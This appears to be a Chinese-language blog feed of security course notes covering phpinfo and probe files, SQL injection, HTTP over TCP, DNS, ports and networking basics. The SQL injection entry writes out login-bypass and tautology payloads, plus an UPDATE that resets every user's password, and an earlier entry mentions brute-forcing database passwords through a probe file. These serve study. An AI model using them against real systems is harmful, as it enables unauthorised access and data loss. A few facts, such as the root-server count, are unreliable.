        <content type="html"><![CDATA[<h1 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h1><p>显示php服务器的配置信息。<br>输出php当前状态的大量信息，包含了PHP编译选项、启用的扩展、PHP版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path变量、配置选项的本地值和预定义变量。<br>因为每个系统安装的不同，phpinfo()常用于在系统上检查配置和预定义变量。</p><h2 id="常用的"><a href="#常用的" class="headerlink" title="常用的"></a>常用的</h2><p>DOCUMENT_ROOT：查看网站根目录<br>disable_functions：禁用的函数<br>allow_url_fopen：打开远程文件<br>allow_url_include：远程文件包含</p><h1 id="l-php探针文件"><a href="#l-php探针文件" class="headerlink" title="l.php探针文件"></a>l.php探针文件</h1><p>包含了当前系统的详细环境配置。<br>可以在该文件的MySQL数据库检测中，爆破数据库的密码。</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第七周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2019/08/25/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/08/25/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="攻击数据存储区"><a href="#攻击数据存储区" class="headerlink" title="攻击数据存储区"></a>攻击数据存储区</h1><p>几乎所有的应用程序都依赖数据存储区来管理应用程序中处理的数据。<br>大多数数据存储区都保存有结构化、可以使用预测先定义的查询格式或语言访问的数据，并包含内部逻辑来管理这些数据。<br>如果攻击者能够破坏应用程序与数据存储的交互，使应用程序检索或修改各种数据，那么攻击者就可以避开应用层对数据访问实施的任何控制。<br>迄今为止，最常用的数据存储区是SQL数据库、基于XML的资料数据库、LDAP目录、一些常见示例。</p><h2 id="注入解释型语言（interpreted-language）"><a href="#注入解释型语言（interpreted-language）" class="headerlink" title="注入解释型语言（interpreted language）"></a>注入解释型语言（interpreted language）</h2><p>是一种在运行时由一个运行时组件（runtime component）解释语言代码并执行其中包含的指令的语言。</p><h2 id="编译型语言（compiled-language）"><a href="#编译型语言（compiled-language）" class="headerlink" title="编译型语言（compiled language）"></a>编译型语言（compiled language）</h2><p>代码在生成时转换成机器指令，然后再运行时直接由使用该语言的计算机处理执行这些指令。</p><h3 id="注释："><a href="#注释：" class="headerlink" title="注释："></a>注释：</h3><p>理论上任何语言都可以使用编译器或解释器来执行。这种区别并不是语言本身的内在特性。通常大多数语言只执行其中的一种方式。开发web应用程序使用的许多核心语言都是解释器执行。SQL、LDAP、Perl和PHP。</p><h2 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h2><p>任何有实际用途的应用程序都会收到用户提交的数据，对其进行处理并执行相应的操作。解释器处理的数据实际上是由程序员编写的<strong>代码</strong>和<strong>用户提交的数据</strong>组成。</p><h3 id="代码注入的方式"><a href="#代码注入的方式" class="headerlink" title="代码注入的方式"></a>代码注入的方式</h3><p>1。使用解释型语言语法的具有特殊意义的句法，向应用程序攻击<br>2。注入机器代码而不是相应语言编写的指令。</p><pre><code>避开登陆：Web应用程序对数据存储实施自主访问控制，构造查询基于用户的帐户和类型来检索添加或修改数据存储区中的数据。                Eg：SQL中知道管理员的帐户名                    SELECT * FROM users WHERE username = ‘admin’—’ AND password=’foo’                    其中（- -）是注释符号上面的语句等同于                    SELECT * FROM users WHERE username=’admin’ 避开了密码检查              在大多数应用程序中，数据库的第一个账户为管理用户，因为这个账户通常手工创建，然后再通过它生成其他应用程序帐户。如果查询返回几个用户的资料，许多应用程序只会处理第一名用户                Eg：以数据库中的第一个用户身份登陆                    OR 1=1 - -                    执行下语句：                    SELECT * FROM users WHERE username= ‘’ OR 1=1 - - AND password = ‘foo’                    上语句等同于                    SELECT * FROM users WHERE username=’’ OR 1=1</code></pre><p><strong>提示：</strong>有时候可以不使用注释符号处理字符串末尾部分的引号，而用引号包含的字符串数据结束注入的输入，“平衡引号”</p><pre><code>Eg：SELECT author,title,year FROM books WHERE publisher = ‘Wiley’ OR ‘a’=’a’ and published=1    效果和 1=1相同</code></pre><h1 id="注入不同的语句类型"><a href="#注入不同的语句类型" class="headerlink" title="注入不同的语句类型"></a>注入不同的语句类型</h1><h2 id="SELECT语句"><a href="#SELECT语句" class="headerlink" title="SELECT语句"></a>SELECT语句</h2><p>最常用的语句，SQL注入攻击的进入点（entry point）通常是查询中的where子句，将用于提交的数据传送给数据库，以控制查询结果的范围。因为WHERE子句一般在SELECT语句的最后，攻击者可以使用注释符号将查询截断到其输入的结束位置，而不使整个查询语法失效。<br>SQL注入漏洞偶尔会影响SELECT查询的其他部分，如ORDER BY子句或表和列名称。</p><h2 id="INSERT语句"><a href="#INSERT语句" class="headerlink" title="INSERT语句"></a>INSERT语句</h2><p>INSERT语句用于在表中建立一个新的数据行。应用程序通常使用这种语句添加一条新的审计日志、创建一个新用户帐户或生成一个新订单。</p><pre><code>Eg：如果username或password字段存在SQL漏洞，那么就可以在表中插入任何数据，包括自己的ID和privs值。</code></pre><p><strong>注意：</strong>必须确保VALUES子句的其他部分正常运行，特别是其中数据向的个数与类型必须正确。由于大多数的数据库都会隐式地将一个整数转换成一个字符串，因此可以在每一个位置都使用一个整数。</p><h2 id="UPDATE语句"><a href="#UPDATE语句" class="headerlink" title="UPDATE语句"></a>UPDATE语句</h2><p>用于修改表中的一行或几行数据，运行机制和INSERT语句类似，只是UPDATE语句通常包含一个WHERE子句，告诉数据库更新表中那些行的数据</p><pre><code>Eg：用户修改密码执行下面语句            UPDATE users SET password=’newsecret’ WHERE user=’marcus’ and password=’secret</code></pre><p><strong>注意：</strong>由于无法提前知道应用程序将根据专门设计的输入执行什么擦左，因此在一个远程应用程序中探查SQL注入漏洞往往非常危险。<strong>特别注意：修改UPDATE语句中的WHERE子句可能会使一个重要的数据库表发生彻底改变。</strong></p><pre><code>例如：UPDATE users SET password=’newsecret’ WHERE user=’admin’ or 1=1 它会重置每一个用户的密码。有时候，在用户成功登陆后，应用程序会使用用户提交的用户名执行各种UPDATE查询，这意味着任何针对WHERE子句的攻击可能会复制到其它语句中，给所有应用程序用户的资料造成严重破坏。</code></pre><p><strong>为规避风险，在开始测试前进行数据库备份非常重要</strong></p><h2 id="DELETE语句"><a href="#DELETE语句" class="headerlink" title="DELETE语句"></a>DELETE语句</h2><p>用于删除表中的一行或几行数。与UPDATE语句一样，通常使用WHERE子句告诉数据库更新表中那行数据，并可能在这个子句中并入用户提交的数据</p><h1 id="注入符号HTTP中的URL编码"><a href="#注入符号HTTP中的URL编码" class="headerlink" title="注入符号HTTP中的URL编码"></a>注入符号HTTP中的URL编码</h1><pre><code>    1．&amp;和=用于连接名/值对，建立查询字符串和POST数据块    &amp; %26    = %3d    2．查询字符串不允许使用空格，如果使用空格整个字符串会立即中止。必须使用 + 或 %20对其编码    3．由于 + 用于编码空格，如果想在字符串中使用 + ，必须使用 %2b 对其编码    4．分号用于分割cookie字段，必须使用 %3b 对其编码</code></pre><h1 id="注入查询结构"><a href="#注入查询结构" class="headerlink" title="注入查询结构"></a>注入查询结构</h1><p>如果用户提交的数据被插入SQL查询结构，而不是查询中的数据项，这时实施SQL注入攻击只需要直接应用有效的SQL语法，而不需要进行任何转义。<br>SQL查询结构中最常见的注入点是ORDER BY子句。<br><strong>ORDER BY</strong>关键字接受某个列名或编号，并根据该列中的值对结果集进行排序。</p><h1 id="“特征”识别数据库"><a href="#“特征”识别数据库" class="headerlink" title="“特征”识别数据库"></a>“特征”识别数据库</h1><p>一种最靠谱的方法：根据数据库联接字符串的不同方法进行识别。在控制某个字符串数据项的查询中，可以在一个请求中提交一个特殊值，然后测试这个连接方法，以生成那个字符串。如果得到相同的结果，就可以确定所使用的数据库类型。</p><pre><code>Eg：数据库如何构建services字符串</code></pre><table><thead><tr><th>Oracle</th><th>‘serv’ &#124;&#124; ‘ices’</th></tr></thead><tbody><tr><td>MS-SQL</td><td>‘serv’ + ‘ices’</td></tr><tr><td>MySQL</td><td>‘serv’ ‘ices’  注意中间的空格</td></tr></tbody></table><pre><code>        数字数据，每个数据项在目标数据库中的求值结果为0，在其它数据库中则会导致错误</code></pre><table><thead><tr><th>Oracle</th><th>BITAND(1,1) –BITAND(1,1)</th></tr></thead><tbody><tr><td>MS-SQL</td><td>@@PACK_RECEIVED-@@PACK_RECEIVED</td></tr><tr><td>MySQL</td><td>CONNECTION_ID()-CONNECTION_ID()</td></tr></tbody></table><p>在识别数据库时，MySQL如何处理某些行内注释（inline comment）也是一个值得关注的问题：<br>如果一个注释以 ! 开头，接着是数据库版本字符串，那么只要数据的实际版本等于或高于该字符串，应用程序就会将注释内容解释为SQL；否则，应用程序就会忽略注释内容，将它作为注释处理。</p><pre><code>Eg：/* !32302 and 1=0 */    如果MySQL版本高于或等于 3.23.02，注入下面的字符串将使SELECT语句和WHERE子句为假</code></pre><h1 id="查找SQL注入漏洞"><a href="#查找SQL注入漏洞" class="headerlink" title="查找SQL注入漏洞"></a>查找SQL注入漏洞</h1><p>最简单的情况是，向应用输入一个意外输入，就可以发现并最终确定一个SQL注入漏洞。<br>复杂，通过检查提交给服务器和返回的任何数据包，检查数据错误信息。<br><strong>注意：</strong>在探查SQL注入漏洞时，一定要确保完全遍历任何可以提交专门设计的输入的多阶段过程。程序通常会从几个请求中收集数据，一旦收集到全部数据，就将其请求保存在数据库中。如果仅在每个请求中提交专门设计的数据并监控应用，对数据的响应，就会遗漏许多SQL注入漏洞。</p><h1 id="UNION操作符"><a href="#UNION操作符" class="headerlink" title="UNION操作符"></a>UNION操作符</h1><p>将两个或几个SELECT语句的结果组合到一个独立的结果中。如果Web应用程序的SELECT语句存在SQL注入漏洞，通常可以使用UNION操作符执行另一次完全独立的查询，并将它的结果与第一次的结果组合在一起。<br>使用UNION操作符注入另外一个SELECT查询，并将查询结果附加在第一次查询结果之后，第二次查询能够从另外一个完全不同的数据库表中提取数据。</p><h2 id="UNION的两个限制"><a href="#UNION的两个限制" class="headerlink" title="UNION的两个限制"></a>UNION的两个限制</h2><p>1。使用UNION操作符组合两个查询结果，这两个结果必须结构相同。他们的列数必须使用按相同顺序出现的相同或兼容的数据类型。<br>2。为注入另一个返回有用结果的查询，攻击者必须知道他所针对的数据库表的名称以及有关列的名称</p><h2 id="查明第一个查询的结构"><a href="#查明第一个查询的结构" class="headerlink" title="查明第一个查询的结构"></a>查明第一个查询的结构</h2><p>1。第二个查询中每种数据要么必须与第一个查询中的对应类型完全相同，要么必须隐含的转换成任何数据类型。如果不知道1某个特殊字段的数据类型，只需要在那个字段输入SELECT NULL即可<br>2。如果数据库返回的错误信息被应用程序截获，还是可以轻易确定注入的查询是否得以执行。<br>3。很多时候，只需要在第一个查询中确定一个使用字符串数据类型的字段就可以达到查询的目的。</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第六周 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于TCP协议中的HTTP一些问题</title>
      <link href="/2019/08/25/%E5%85%B3%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84HTTP%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
      <url>/2019/08/25/%E5%85%B3%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84HTTP%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="1。浏览器在与服务器建立了一个-TCP-连接后是否会在一个-HTTP-请求完成后断开？"><a href="#1。浏览器在与服务器建立了一个-TCP-连接后是否会在一个-HTTP-请求完成后断开？" class="headerlink" title="1。浏览器在与服务器建立了一个 TCP 连接后是否会在一个 HTTP 请求完成后断开？"></a>1。浏览器在与服务器建立了一个 TCP 连接后是否会在一个 HTTP 请求完成后断开？</h1><p>在HTTP/1.0中，一个服务器在发送完一个HTTP响应后，会断开TCP链接。但是每次请求重新建立和断开TCP连接，代价过大。所以某些服务器对Connection：keep-alive的Header进行了支持。<br>    在HTTP/1.1中，就把Connection头写进了标准，并且默认开启持久支持。除非请求中写明了Connection：close否则浏览器和服务器之间是会持续一段时间的TCP连接，不会一个请求就结束</p><h1 id="2。一个-TCP-连接可以对应几个-HTTP-请求？"><a href="#2。一个-TCP-连接可以对应几个-HTTP-请求？" class="headerlink" title="2。一个 TCP 连接可以对应几个 HTTP 请求？"></a>2。一个 TCP 连接可以对应几个 HTTP 请求？</h1><p>一个TCP连接如果持续连接可以发送多个HTTP请求</p><h1 id="3。一个-TCP-连接中-HTTP-请求发送可以一起发送么？"><a href="#3。一个-TCP-连接中-HTTP-请求发送可以一起发送么？" class="headerlink" title="3。一个 TCP 连接中 HTTP 请求发送可以一起发送么？"></a>3。一个 TCP 连接中 HTTP 请求发送可以一起发送么？</h1><pre><code>HTTP/1.1存在一个问题：两个请求的生命周期不能重叠，任意两个HTTP请求从开始到结束的时间在同一个TCP连接里不能重叠。HTTP/1.1中规定了Pipelining试图解决此问题，但是浏览器中默认关闭。（因为作为文本传输协议浏览器要分别不同文件的传输内容，程序设计会很复杂，同时资源消耗比较大）    HTTP2中Multiplexing存在，多个HTTP请求可以在同一个TCP连接中并行进行。    HTTP/1.1解决页面加载效率的方式：1．    维持和服务器已经建立的TCP连接，在同一连接顺序上处理多个请求2．    和服务器建立多个TCP连接</code></pre><h1 id="4。为什么有的时候刷新页面不需要重新建立-SSL-连接？"><a href="#4。为什么有的时候刷新页面不需要重新建立-SSL-连接？" class="headerlink" title="4。为什么有的时候刷新页面不需要重新建立 SSL 连接？"></a>4。为什么有的时候刷新页面不需要重新建立 SSL 连接？</h1><p>TCP 连接有的时候会被浏览器和服务端维持一段时间。TCP 不需要重新建立，SSL 自然也会用之前的。</p><h1 id="5。浏览器对同一-Host-建立-TCP-连接到数量有没有限制？"><a href="#5。浏览器对同一-Host-建立-TCP-连接到数量有没有限制？" class="headerlink" title="5。浏览器对同一 Host 建立 TCP 连接到数量有没有限制？"></a>5。浏览器对同一 Host 建立 TCP 连接到数量有没有限制？</h1><p>理论上可以无限多，但现实是会根据浏览器的设置自行设置。</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第六周 </tag>
            
            <tag> 网络基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS域名系统</title>
      <link href="/2019/08/24/DNS%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F/"/>
      <url>/2019/08/24/DNS%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="DNS（Domain-Name-System）域名系统"><a href="#DNS（Domain-Name-System）域名系统" class="headerlink" title="DNS（Domain Name System）域名系统"></a>DNS（Domain Name System）域名系统</h1><p>当前对于每一级域名长度限制是63个字符，域名总长度不能超过253个字符。只支持ASCII字符集，2008年后开始支持Unicode字符集。</p><h2 id="DNS系统中常见的资源记录类型"><a href="#DNS系统中常见的资源记录类型" class="headerlink" title="DNS系统中常见的资源记录类型"></a>DNS系统中常见的资源记录类型</h2><p>主条目：域名服务器记录列表<br>主机记录（A记录）：A记录是用于名称解析的重要记录，它将特定的主机名映射到对应的主机IP地址上。<br>别名记录（CNAME记录）：用于将某个别名指向到某个A记录上，这样就不需要再为某个新名字另外创建一条新的A记录<br>IPv6主机记录（AAAA记录）：与A记录对应，用于将特定的主机名映射到一个主机的IPv6地址上。<br>服务器位置记录（SRV记录）：用于定义提供服务器的位置，如主机（hostname），端口（port name）等<br>NAPTR记录：提供正则表达式方式去映射一个域名。<strong>代表：ENUM查询</strong></p><h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><p>DNS通过允许一个名称服务器把它的一部分名称服务（zone）委托给子服务器而实现的一种层次结构的名称空间。<br>任何一个使用IP计算机的网络都可以使用DNS来实现它自己的私有名称系统。而这是基于504个全球的根“根域名服务器”。</p><h2 id="域名解析的特点"><a href="#域名解析的特点" class="headerlink" title="域名解析的特点"></a>域名解析的特点</h2><p>一个域名对应一个IP地址，一个IP地址可以对应多个域名。</p><h2 id="域名解析的流程"><a href="#域名解析的流程" class="headerlink" title="域名解析的流程"></a>域名解析的流程</h2><p><img src="/DNS%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F/20190824115712448.png" alt></p><h3 id="DNS查询方式两种"><a href="#DNS查询方式两种" class="headerlink" title="DNS查询方式两种"></a>DNS查询方式两种</h3><h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4><p>DNS客户端设置使用的DNS服务器一般使用递归，负责处理客户端的DNS查询请求。</p><h4 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h4><p>DNS服务端之间一般采用迭代查询方式</p><h3 id="以查询-www-baidu-com-为例"><a href="#以查询-www-baidu-com-为例" class="headerlink" title="以查询 www.baidu.com 为例"></a>以查询 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 为例</h3><p>客户端：发送查询报文，至DNS服务器首先检查自身缓存，如果记录存在则直接返回结果。<br>如果记录不存在或过期则：</p><pre><code>    1.DNS服务器向根域名服务器发送查询报文，跟域名服务器返回顶级域名的域名服务器地址    2.DNS服务器向顶级域名服务器发送查询报文，得到二级域名服务器的域名服务器地址。    3.DNS服务器向二级域名服务器发送查询报文，得到主机A的记录，存入自身缓存并返回客户端。</code></pre><h4 id="分级查询"><a href="#分级查询" class="headerlink" title="分级查询"></a>分级查询</h4><p><a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 对应的真正域名 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>. 末尾的 . 称为根域名，每个域名都有根域名，因此通常省略<br>根域名——〉顶级域名——〉次级域名——〉主机名（host）又称三级域名。用户在自己的域里面为服务器配名称，任意。</p><h5 id="域名分别对应："><a href="#域名分别对应：" class="headerlink" title="域名分别对应："></a>域名分别对应：</h5><p>根域名：省略<br>顶级域名（Top-Level Domain，TLD）：eg： .com、.net<br>次级域名（Second-Level Domain，SLD）：这里是 .baidu<br>主机名：这里是 www</p><h4 id="WHOIS（域名数据库查询）"><a href="#WHOIS（域名数据库查询）" class="headerlink" title="WHOIS（域名数据库查询）"></a>WHOIS（域名数据库查询）</h4><p>一个域名所有者可以通过查询WHOIS数据库而被找到；对于大多数根域名服务器，基本的WHOIS由ICANN维护，而WHOIS的细节控制由控制那个域的域注册机构维护。<br>240多个国家代码顶级域名（ccTLDs）,通常由该域名权威注册机构负责维护WHOIS。<br>    中国互联网信息中心负责 .CN域名的WHOIS<br>    香港互联网注册管理有限公司负责 .HK<br>    台湾网上信息中心负责 .TW</p><h2 id="域名解析常用的类型"><a href="#域名解析常用的类型" class="headerlink" title="域名解析常用的类型"></a>域名解析常用的类型</h2><p>A记录解析：记录类型选择“A”；记录值填写空间商提供的主机地址；MX优先级不需要设置；TTL设置默认为3600<br>CNAME记录解析：解析方式和“A”记录类型基本一致<br>MX记录解析：解析邮箱时使用</p><h2 id="常见名词"><a href="#常见名词" class="headerlink" title="常见名词"></a>常见名词</h2><h3 id="泛域名解析"><a href="#泛域名解析" class="headerlink" title="泛域名解析"></a>泛域名解析</h3><p>将 *域名解析到同一IP</p><h3 id="域名智能解析"><a href="#域名智能解析" class="headerlink" title="域名智能解析"></a>域名智能解析</h3><p>除了具备一般的基本DNS解析功能外，还可以自动识别浏览者的来源，并把相同的域名智能DNS解析到双线路机器的网络中。</p><h3 id="MX记录"><a href="#MX记录" class="headerlink" title="MX记录"></a>MX记录</h3><p>路由器记录，用户可以将该域名下的邮件服务器指向自己的mail server上，然后自动操作所有的邮箱设置。</p><h3 id="CNAME记录"><a href="#CNAME记录" class="headerlink" title="CNAME记录"></a>CNAME记录</h3><p>别名记录，允许将多个名字映射到同一台计算机，与A记录不同的是，CNAME别名记录设置的可以是一个域名的描述而不一定是IP地址。通常用于同时提供WWW和MAIL服务的计算机</p><h4 id="CNAME记录特点"><a href="#CNAME记录特点" class="headerlink" title="CNAME记录特点"></a>CNAME记录特点</h4><p>方便管理，不同域名的记录</p><h3 id="TTL值（Time-To-Live）"><a href="#TTL值（Time-To-Live）" class="headerlink" title="TTL值（Time To Live）"></a>TTL值（Time To Live）</h3><p>DNS记录在DNS服务器缓存中存活的时间</p><h3 id="A记录"><a href="#A记录" class="headerlink" title="A记录"></a>A记录</h3><p>WEB服务器IP指向A（Address）记录使用来指定主机名（或域名）对应的IP地址记录</p><h3 id="URL转发"><a href="#URL转发" class="headerlink" title="URL转发"></a>URL转发</h3><p>一台服务器（没有独立IP地址）或者是域名B，当访问域名A时访问到B域名的内容。</p><h4 id="URL转发特点、与CNAME最大区别"><a href="#URL转发特点、与CNAME最大区别" class="headerlink" title="URL转发特点、与CNAME最大区别"></a>URL转发特点、与CNAME最大区别</h4><p>URL转发可以转发到某个目录下，某个文件上。而CNAME不行<br>CNAME是域名与域名别名对应的记录。</p><h3 id="动态域名解析"><a href="#动态域名解析" class="headerlink" title="动态域名解析"></a>动态域名解析</h3><p>A记录中域名对应的IP是静态IP，把域名解析到动态IP上的过程。（域名服务商支持动态域名解析，一般收费）</p><h3 id="域名解析器"><a href="#域名解析器" class="headerlink" title="域名解析器"></a>域名解析器</h3><p>把域名转换成主机所在IP地址的中介。系统会自动保存经常使用的IP地址与对应域名。访问直接从DNS缓存里提取对应IP地址，加快联网速度。</p><h2 id="根域名服务器"><a href="#根域名服务器" class="headerlink" title="根域名服务器"></a>根域名服务器</h2><p>全球有504个根“根域名服务器”（分成13组，分别编号为A至M）。从这504个根服务器开始，余下的Internet DNS名字空间被委托给其他的DNS服务器，这些服务器提供DNS名称空间中的特定部分。</p><h3 id="IPv4和IPv6根域名服务器"><a href="#IPv4和IPv6根域名服务器" class="headerlink" title="IPv4和IPv6根域名服务器"></a>IPv4和IPv6根域名服务器</h3><p>现在IPv4根服务器体系已经趋于完善。随着IPv6网络的发展，“雪人计划”于2016年在全球16个国家完成25台IPv6根服务器架设。形成在原13台根+25台IPv6根的新局面。中国有4台IPv6根（1台主根服务器和三台辅根服务器组成）。</p><h3 id="IPv4只有13台根服务器的原因"><a href="#IPv4只有13台根服务器的原因" class="headerlink" title="IPv4只有13台根服务器的原因"></a>IPv4只有13台根服务器的原因</h3><p>DNS协议（域名解析协议），使用了端口上的UDP和TCP协议。UDP通常用于主服务器和从服务器之间的传输。<br>由于在所有UDP查询和响应中能保证正常工作的最大长度是512字节，限制了根服务器的数量和名字。<br>要让所有的根服务器数据能包含在一个512字节的UDP包中，IPv4根服务器只能限制13个，而其每个服务器要使用字母表中的单个字母命名，这也是IPv4根服务器是从A–M命名的原因。</p><h3 id="国际化域名"><a href="#国际化域名" class="headerlink" title="国际化域名"></a>国际化域名</h3><p>主目录：Punycode<br>主要用于把域名从地方语言采用的Unicode编码转换为DNS系统的编码。Punycode可以防止IDN欺骗。</p><h4 id="IDN欺骗"><a href="#IDN欺骗" class="headerlink" title="IDN欺骗"></a>IDN欺骗</h4><p>网址欺骗的手法之一。利用国际化域名称（IDN）可以以Unicode字符命名网址的特性，使用同行异义字等。</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第六周 </tag>
            
            <tag> 网络基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口</title>
      <link href="/2019/08/24/%E7%AB%AF%E5%8F%A3/"/>
      <url>/2019/08/24/%E7%AB%AF%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="端口（port）"><a href="#端口（port）" class="headerlink" title="端口（port）"></a>端口（port）</h1><p>设备与外界通讯交流的出口。端口可分为虚拟端口和物理端口。<br>虚拟端口：计算机内部或交换机路由器内的端口，不可见<br>物理端口：可见端口<br>是接口电路中的一些寄存器，这些寄存器分别用来存放数据信息，控制信息和状态信息，相应的端口分别称为数据端口、控制端口、状态端口</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="硬件端口"><a href="#硬件端口" class="headerlink" title="硬件端口"></a>硬件端口</h3><p>CPU通过接口寄存器或特定电路与外设进行数据传送，这些寄存器或特定电路称之为端口</p><h3 id="网络端口"><a href="#网络端口" class="headerlink" title="网络端口"></a>网络端口</h3><p>在网路技术中，端口有好几种意思。集线器、交换机、路由器的端口指的是连接其他网络设备的接口。<br>特指TCP/IP协议中的端口，是逻辑端口</p><h4 id="网络中端口共有-2的16次方（65535个）端口号"><a href="#网络中端口共有-2的16次方（65535个）端口号" class="headerlink" title="网络中端口共有 2的16次方（65535个）端口号"></a>网络中端口共有 2的16次方（65535个）端口号</h4><p>0–1023：规则设计这负责<br>0–255：公用端口<br>256–1023：公司专用<br>1024–65535：临时端口</p><h4 id="常用的端口"><a href="#常用的端口" class="headerlink" title="常用的端口"></a>常用的端口</h4><p>8080：中间件（代理服务器的端口）<br>21：FTP<br>22：ssh<br>23：Telnet<br>25：SMTP，用于发送邮件<br>80：HTTP，用于网页浏览<br>102：Message transfer agent(MTA)-X 400 over TCP/IP，消息传输代理<br>110：Post Office Protocol-Version3<br>111：SUN公司的RPC服务所有端口<br>119：Network News Transfer Protocol<br>135：Location Service<br>137、138、139：NETBIOS Name Service<br>161：SNMP<br>177：X Display Managet Control Protocol<br>389：LDAP、ILS</p><h3 id="软件端口"><a href="#软件端口" class="headerlink" title="软件端口"></a>软件端口</h3><p>缓冲区</p><h1 id="端口转发-Port-forwarding"><a href="#端口转发-Port-forwarding" class="headerlink" title="端口转发(Port forwarding)"></a>端口转发(Port forwarding)</h1><p>有时称隧道，是安全壳（SSH）为网络安全通信使用的一种方法。<br>转发一个网络端口从一个网络节点到另一个网络节点的行为，是一个外部用户从外部经过一个被激活的NAT路由器到达一个在私有内部IP地址（局域网内部）上的一个端口。</p><h2 id="端口转发与端口映射"><a href="#端口转发与端口映射" class="headerlink" title="端口转发与端口映射"></a>端口转发与端口映射</h2><table><thead><tr><th>端口转发</th><th>端口映射</th></tr></thead><tbody><tr><td>将一个端口，这个端口可以是本机端口也可以是本机能访问的任意主机的端口可以转发到任意一台可以访问的IP上，通常这个IP是公网IP（方便使用）</td><td>原理核心和端口转发一样，不过是将本机的端口转发到远程的某个端口</td></tr></tbody></table><p><strong>在第三层网络层</strong></p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第六周 </tag>
            
            <tag> 网络基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络基础</title>
      <link href="/2019/08/23/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
      <url>/2019/08/23/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="常见网络设备"><a href="#常见网络设备" class="headerlink" title="常见网络设备"></a>常见网络设备</h1><h2 id="网卡"><a href="#网卡" class="headerlink" title="网卡"></a>网卡</h2><p>计算机网络上进行通讯的计算机硬件，拥有MAC地址属于OSI第一层物理层</p><h3 id="修改MAC地址：设备管理器-〉网络地址"><a href="#修改MAC地址：设备管理器-〉网络地址" class="headerlink" title="修改MAC地址：设备管理器-〉网络地址"></a>修改MAC地址：设备管理器-〉网络地址</h3><p>cmd中ipconfig查看当前网卡的MAC地址<br><img src="/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/20190823085023494.png" alt><br><img src="/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/20190823084911720.png" alt><br>修改后会自动重载再次查看数值发生变化</p><h2 id="集线器“Hub”"><a href="#集线器“Hub”" class="headerlink" title="集线器“Hub”"></a>集线器“Hub”</h2><p>用于扩大网络传输距离，把所有节点集中到以它为中心的节点上。在OSI第一层。属于纯硬件网络底层设备。不具备“智能记忆”和“学习能力”。<strong>不具有MAC地址表</strong>，发送数据没有针对性，采用广播方式发送。</p><h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><p>用于数据转发的网络设备，工作于OSI模型第二层。是集线器的升级版。具有“智能记忆”和“学习能力”，<strong>使用MAC地址来寻址。</strong>常见的是以太网交换机</p><h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><p>连接两个或多个网络硬件设备，起网关作用。运行在OSI模型第三层，使用IP地址通信，现在交换机基本上都是三层交换机和路由器没有什么区别</p><h1 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h1><h2 id="局域网-LAN"><a href="#局域网-LAN" class="headerlink" title="局域网(LAN)"></a>局域网(LAN)</h2><p>覆盖范围一般是方圆几米之内，具备安装便捷、成本节约、扩展方便的特点。具备网络传输速度快，性能稳定，框架简易，环境封闭。<br>局域网大体上由计算机设备（服务器与工作站）、网络连接设备（网卡、集线器、交换机）、网络传输介质（网线：同轴电缆、双绞线、光缆）3大部分构成。<br>局域网是一种似有网络，被广泛用来连接个人计算机和消费电子设备，使它们能够共享资源和交换信息。</p><h3 id="局域网的分类"><a href="#局域网的分类" class="headerlink" title="局域网的分类"></a>局域网的分类</h3><h4 id="无线局域网（WLAN）"><a href="#无线局域网（WLAN）" class="headerlink" title="无线局域网（WLAN）"></a>无线局域网（WLAN）</h4><p>设备连接接入点（无线路由器/基站），接入点负责中继无线计算之间的数据包，还负责无线计算机和Internet之间的数据包<br>无线局域网一个标准称为IEEE 802.11，俗称WIFI</p><h4 id="有线局域网"><a href="#有线局域网" 